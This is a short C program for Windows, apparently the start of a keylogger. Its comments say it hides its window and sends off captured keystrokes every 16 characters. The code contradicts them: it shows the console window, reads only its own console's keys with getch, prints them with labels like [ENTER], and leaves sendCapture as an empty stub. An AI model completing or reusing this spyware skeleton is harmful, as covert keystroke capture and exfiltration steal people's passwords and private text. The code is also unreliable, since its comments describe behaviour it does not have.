#include <stdio.h>
#include <Windows.h>
#include <time.h>

int main(void) {
	char key;
	char capture[16]; // Send off keystrokes when we have 16 characters.

	// Hide window
	HWND window;
	AllocConsole();
	window = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(window, 1);

	while (1) {
		Sleep(20);
		if (kbhit()) {
			key = getch();
			switch ((int)key) {

			case ' ': 
				printf(" ");
				break;

			case 0x09: 
				printf("[TAB]");
				break;

			case 0x0D:
				printf("[ENTER]");
				break;

			case 0x1B: 
				printf("[ESC]");
				break;

			case 0x08:
				printf("[BACKSPACE]");
				break;

			default:
				printf("%c", key);
				break;
			}
		}
	}

	return 0;
}

int sendCapture(int capture) {

}